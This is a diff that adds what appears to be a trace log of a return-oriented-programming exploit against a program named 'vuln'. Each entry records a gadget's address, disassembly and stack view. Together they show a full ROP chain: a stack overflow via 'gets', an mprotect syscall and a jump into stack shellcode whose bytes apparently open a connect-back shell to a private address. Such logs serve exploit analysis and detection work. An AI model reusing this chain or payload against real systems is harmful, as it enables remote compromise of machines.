@@ -1,0 +1,215 @@
+PID: 11417  Thread name:vuln 
+Stack address: 0x7fffffffd960 Gadget address: 0x7fffffffdde0 
+Gadget VMA name: [stack] Gadget VMA permissions: rwx 
+Gadget Symbol: None+0x1fde0
+Gadget address disassembly: 
+
+0x7fffffffdde0 cb               RETF
+0x7fffffffdde1 7d38             JGE 0x7fffffffde1b
+0x7fffffffdde3 27               DB 0x27
+0x7fffffffdde4 0000             ADD [RAX], AL
+0x7fffffffdde6 0000             ADD [RAX], AL
+0x7fffffffdde8 f7f5             DIV EBP
+0x7fffffffddea e75c             OUT 0x5c, EAX
+0x7fffffffddec 0000             ADD [RAX], AL
+0x7fffffffddee 0000             ADD [RAX], AL
+
+Stack VMA: [stack] Stack Permissions: rwx
+Stack view: 
+0x7fffffffd940        0x400000007
+0x7fffffffd948           0x1bb730
+0x7fffffffd950       0x3000000008
+0x7fffffffd958     0x7fffffffdea0 [stack]+0x1fea0
+0x7fffffffd960     0x7fffffffdde0 [stack]+0x1fde0
+0x7fffffffd968               0xb0
+0x7fffffffd970     0x7ffff7a72600
+0x7fffffffd978     0x7ffff7dd4400
+0x7fffffffd980           0x188e4c
+
+
+PID: 11417  Thread name:vuln 
+Stack address: 0x7fffffffdee8 Gadget address: 0x400623 
+Gadget VMA name: / Gadget VMA permissions: r-x 
+Gadget Symbol: gets+0x623
+Gadget address disassembly: 
+
+0x400623 5f               POP RDI
+0x400624 c3               RET
+0x400625 66662e0f1f840000000000 NOP WORD [RAX+RAX+0x0]
+0x400630 f3c3             RET
+0x400632 00               DB 0x0
+
+Stack VMA: [stack] Stack Permissions: rwx
+Stack view: 
+0x7fffffffdec8 0x4141414141414141
+0x7fffffffded0 0x4141414141414141
+0x7fffffffded8 0x4141414141414141
+0x7fffffffdee0 0x4141414141414141
+0x7fffffffdee8           0x400623 /.gets+0x623
+0x7fffffffdef0     0x7ffffffde000
+0x7fffffffdef8     0x7ffff7a386f5 /.__gconv_get_alias_db+0x10a5
+0x7fffffffdf00            0x21000
+0x7fffffffdf08     0x7ffff7a15b8e /.h_errno+0x1af2
+
+
+PID: 11417  Thread name:vuln 
+Stack address: 0x7fffffffdef8 Gadget address: 0x7ffff7a386f5 
+Gadget VMA name: / Gadget VMA permissions: r-x 
+Gadget Symbol: __gconv_get_alias_db+0x10a5
+Gadget address disassembly: 
+
+0x7ffff7a386f5 5e               POP RSI
+0x7ffff7a386f6 c3               RET
+0x7ffff7a386f7 660f1f840000000000 NOP WORD [RAX+RAX+0x0]
+0x7ffff7a38700 488b33           MOV RSI, [RBX]
+0x7ffff7a38703 4c               DB 0x4c
+0x7ffff7a38704 89               DB 0x89
+
+Stack VMA: [stack] Stack Permissions: rwx
+Stack view: 
+0x7fffffffded8 0x4141414141414141
+0x7fffffffdee0 0x4141414141414141
+0x7fffffffdee8           0x400623 /.gets+0x623
+0x7fffffffdef0     0x7ffffffde000
+0x7fffffffdef8     0x7ffff7a386f5 /.__gconv_get_alias_db+0x10a5
+0x7fffffffdf00            0x21000
+0x7fffffffdf08     0x7ffff7a15b8e /.h_errno+0x1af2
+0x7fffffffdf10                0x7
+0x7fffffffdf18     0x7ffff7a2d3b8 /.h_errno+0x1931c
+
+
+PID: 11417  Thread name:vuln 
+Stack address: 0x7fffffffdf08 Gadget address: 0x7ffff7a15b8e 
+Gadget VMA name: / Gadget VMA permissions: r-x 
+Gadget Symbol: h_errno+0x1af2
+Gadget address disassembly: 
+
+0x7ffff7a15b8e 5a               POP RDX
+0x7ffff7a15b8f c3               RET
+0x7ffff7a15b90 f8               CLC
+0x7ffff7a15b91 385ac3           CMP [RDX-0x3d], BL
+0x7ffff7a15b94 f8               CLC
+0x7ffff7a15b95 385ac3           CMP [RDX-0x3d], BL
+0x7ffff7a15b98 f8               CLC
+0x7ffff7a15b99 385ac3           CMP [RDX-0x3d], BL
+0x7ffff7a15b9c 4fcb             RETF
+
+Stack VMA: [stack] Stack Permissions: rwx
+Stack view: 
+0x7fffffffdee8           0x400623 /.gets+0x623
+0x7fffffffdef0     0x7ffffffde000
+0x7fffffffdef8     0x7ffff7a386f5 /.__gconv_get_alias_db+0x10a5
+0x7fffffffdf00            0x21000
+0x7fffffffdf08     0x7ffff7a15b8e /.h_errno+0x1af2
+0x7fffffffdf10                0x7
+0x7fffffffdf18     0x7ffff7a2d3b8 /.h_errno+0x1931c
+0x7fffffffdf20               0x11
+0x7fffffffdf28     0x7ffff7a50bed /.labs+0xd
+
+
+PID: 11417  Thread name:vuln 
+Stack address: 0x7fffffffdf18 Gadget address: 0x7ffff7a2d3b8 
+Gadget VMA name: / Gadget VMA permissions: r-x 
+Gadget Symbol: h_errno+0x1931c
+Gadget address disassembly: 
+
+0x7ffff7a2d3b8 58               POP RAX
+0x7ffff7a2d3b9 c3               RET
+0x7ffff7a2d3ba 3b00             CMP EAX, [RAX]
+0x7ffff7a2d3bc 0000             ADD [RAX], AL
+0x7ffff7a2d3be 0000             ADD [RAX], AL
+0x7ffff7a2d3c0 0800             OR [RAX], AL
+0x7ffff7a2d3c2 0000             ADD [RAX], AL
+0x7ffff7a2d3c4 0000             ADD [RAX], AL
+0x7ffff7a2d3c6 0000             ADD [RAX], AL
+
+Stack VMA: [stack] Stack Permissions: rwx
+Stack view: 
+0x7fffffffdef8     0x7ffff7a386f5 /.__gconv_get_alias_db+0x10a5
+0x7fffffffdf00            0x21000
+0x7fffffffdf08     0x7ffff7a15b8e /.h_errno+0x1af2
+0x7fffffffdf10                0x7
+0x7fffffffdf18     0x7ffff7a2d3b8 /.h_errno+0x1931c
+0x7fffffffdf20               0x11
+0x7fffffffdf28     0x7ffff7a50bed /.labs+0xd
+0x7fffffffdf30     0x7ffff7ad6c95 /.getppid+0x5
+0x7fffffffdf38     0x7ffff7a16a4d /.h_errno+0x29b1
+
+
+PID: 11417  Thread name:vuln 
+Stack address: 0x7fffffffdf28 Gadget address: 0x7ffff7a50bed 
+Gadget VMA name: / Gadget VMA permissions: r-x 
+Gadget Symbol: labs+0xd
+Gadget address disassembly: 
+
+0x7ffff7a50bed 4829d0           SUB RAX, RDX
+0x7ffff7a50bf0 c3               RET
+0x7ffff7a50bf1 662e0f1f840000000000 NOP WORD [RAX+RAX+0x0]
+0x7ffff7a50bfb 0f               DB 0xf
+0x7ffff7a50bfc 1f               DB 0x1f
+
+Stack VMA: [stack] Stack Permissions: rwx
+Stack view: 
+0x7fffffffdf08     0x7ffff7a15b8e /.h_errno+0x1af2
+0x7fffffffdf10                0x7
+0x7fffffffdf18     0x7ffff7a2d3b8 /.h_errno+0x1931c
+0x7fffffffdf20               0x11
+0x7fffffffdf28     0x7ffff7a50bed /.labs+0xd
+0x7fffffffdf30     0x7ffff7ad6c95 /.getppid+0x5
+0x7fffffffdf38     0x7ffff7a16a4d /.h_errno+0x29b1
+0x7fffffffdf40 0x6800000100c48148
+0x7fffffffdf48 0x5c11686601fea8c0
+
+
+PID: 11417  Thread name:vuln 
+Stack address: 0x7fffffffdf30 Gadget address: 0x7ffff7ad6c95 
+Gadget VMA name: / Gadget VMA permissions: r-x 
+Gadget Symbol: getppid+0x5
+Gadget address disassembly: 
+
+0x7ffff7ad6c95 0f05             SYSCALL
+0x7ffff7ad6c97 c3               RET
+0x7ffff7ad6c98 0f1f840000000000 NOP DWORD [RAX+RAX+0x0]
+0x7ffff7ad6ca0 b866000000       MOV EAX, 0x66
+
+Stack VMA: [stack] Stack Permissions: rwx
+Stack view: 
+0x7fffffffdf10                0x7
+0x7fffffffdf18     0x7ffff7a2d3b8 /.h_errno+0x1931c
+0x7fffffffdf20               0x11
+0x7fffffffdf28     0x7ffff7a50bed /.labs+0xd
+0x7fffffffdf30     0x7ffff7ad6c95 /.getppid+0x5
+0x7fffffffdf38     0x7ffff7a16a4d /.h_errno+0x29b1
+0x7fffffffdf40 0x6800000100c48148
+0x7fffffffdf48 0x5c11686601fea8c0
+0x7fffffffdf50 0x6a106a2a6a026a66
+
+
+PID: 11417  Thread name:vuln 
+Stack address: 0x7fffffffdf38 Gadget address: 0x7ffff7a16a4d 
+Gadget VMA name: / Gadget VMA permissions: r-x 
+Gadget Symbol: h_errno+0x29b1
+Gadget address disassembly: 
+
+0x7ffff7a16a4d ffe4             JMP RSP
+0x7ffff7a16a4f 1b7fce           SBB EDI, [RDI-0x32]
+0x7ffff7a16a52 dbce             FCMOVNE ST0, ST6
+0x7ffff7a16a54 46f0e4a9         IN AL, 0xa9
+0x7ffff7a16a58 6656             PUSH SI
+0x7ffff7a16a5a a7               CMPSD
+0x7ffff7a16a5b 15               DB 0x15
+0x7ffff7a16a5c 13               DB 0x13
+
+Stack VMA: [stack] Stack Permissions: rwx
+Stack view: 
+0x7fffffffdf18     0x7ffff7a2d3b8 /.h_errno+0x1931c
+0x7fffffffdf20               0x11
+0x7fffffffdf28     0x7ffff7a50bed /.labs+0xd
+0x7fffffffdf30     0x7ffff7ad6c95 /.getppid+0x5
+0x7fffffffdf38     0x7ffff7a16a4d /.h_errno+0x29b1
+0x7fffffffdf40 0x6800000100c48148
+0x7fffffffdf48 0x5c11686601fea8c0
+0x7fffffffdf50 0x6a106a2a6a026a66
+0x7fffffffdf58 0x485e5f026a016a29
+
+
